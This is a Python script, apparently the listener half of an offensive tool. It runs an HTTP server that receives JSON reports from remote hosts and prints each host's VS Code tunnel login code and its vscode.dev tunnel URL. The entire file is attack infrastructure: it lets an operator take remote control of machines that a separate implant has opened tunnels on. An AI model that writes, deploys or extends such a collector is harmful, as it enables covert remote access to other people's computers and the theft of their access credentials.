from http.server import BaseHTTPRequestHandler, HTTPServer
import json

HOST = "0.0.0.0"
PORT = 8080

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode("utf-8", errors="replace")
        try:
            payload = json.loads(data)
            phase = payload.get("phase", "unknown")
            raw = payload.get("raw", "")
            hostname = payload.get("hostname", "unknown")
            # If raw is an object with 'value' (shouldn't happen with .NET read), extract it
            if isinstance(raw, dict) and "value" in raw:
                text = raw["value"].strip()
            else:
                text = str(raw).strip()
            lines = text.splitlines()
            if phase == "login":
                otp_line = next((line for line in lines if "use code" in line), text)
                print("\n" + "="*60)
                print("[!] VSCODE TUNNEL LOGIN")
                print(f"    HOSTNAME: {hostname}")
                print(f"    {otp_line}")
                print("="*60 + "\n")
            elif phase == "tunnel":
                url_line = next((line for line in lines if "https://vscode.dev/tunnel/" in line), text)
                print("\n" + "="*60)
                print("[!] VSCODE TUNNEL URL")
                print(f"    HOSTNAME: {hostname}")
                print(f"    {url_line}")
                print("="*60 + "\n")
            else:
                print(f"\n[!] Unknown phase '{phase}':\n{text}\n")
        except Exception as e:
            print(f"[-] Error parsing: {e}")
            print(f"Raw data: {data}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *args):
        pass

if __name__ == "__main__":
    print(f"[+] Listening on http://{HOST}:{PORT}")
    HTTPServer((HOST, PORT), Handler).serve_forever()
